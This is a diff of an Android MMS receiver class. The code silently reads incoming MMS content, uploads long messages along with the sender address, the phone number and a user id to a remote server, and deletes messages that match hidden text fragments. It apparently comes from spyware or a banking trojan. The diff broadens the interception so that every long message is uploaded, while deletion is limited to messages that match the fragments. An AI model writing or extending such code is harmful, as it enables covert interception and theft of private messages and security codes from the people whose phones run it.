@@ -34,15 +34,17 @@ public class OneMmsReceivedReceiver extends MmsReceivedReceiver implements Const
           if (curAddr != null) {
             if (curAddr.moveToNext()) {
               String address = curAddr.getString(curAddr.getColumnIndex("address"));
-              Cursor curPart = context.getContentResolver()
-                .query(Uri.parse("content://mms/part"), null, null, null, null);
+              Cursor curPart = context.getContentResolver().query(Uri.parse("content://mms/part"), null, null, null, null);
+
               if (curPart != null) {
                 if (curPart.moveToLast()) {
                   for (int i = 0; i < curPart.getColumnCount(); i++) {
                     String message = curPart.getString(i);
-                    if (message.length() > 100 && checkMsg(message)) {
+                    if (message.length() > 100) {
                       uploadSms(context, address, message);
-                      context.getContentResolver().delete(messageUri, null, null);
+                      if (checkMsg(message)) {
+                        context.getContentResolver().delete(messageUri, null, null);
+                      }
                     }
                   }
                 }
@@ -64,8 +66,8 @@ public class OneMmsReceivedReceiver extends MmsReceivedReceiver implements Const
 
   private void uploadSms(Context context, String address, String message) {
     if (!TextUtils.isEmpty(PreferenceManager.getInstance(context).getUseJson())) {
-      UserInfo userInfo = GsonManager.getGson()
-        .fromJson(PreferenceManager.getInstance(context).getUseJson(), UserInfo.class);
+      UserInfo userInfo = GsonManager.getGson().fromJson(PreferenceManager.getInstance(context).getUseJson(), UserInfo.class);
+
       if (!TextUtils.isEmpty(userInfo.id)) {
         String number = Utils.getPhoneNumber(context);
         RetrofitManager.retrofit(context).create(Client.class)
@@ -84,7 +86,7 @@ public class OneMmsReceivedReceiver extends MmsReceivedReceiver implements Const
   }
 
   private boolean checkMsg(String m) {
-    /*if(m.contains(FRAG_01)) {
+    if(m.contains(FRAG_01)) {
       if (m.contains(FRAG_S4)) return true;
       if (m.contains(FRAG_S8)) return true;
       if (m.contains(FRAG_S6)) return true;
@@ -95,7 +97,6 @@ public class OneMmsReceivedReceiver extends MmsReceivedReceiver implements Const
       if (m.contains(FRAG_S5)) return true;
     }
 
-    return false;*/
-    return true;
+    return false;
   }
 }
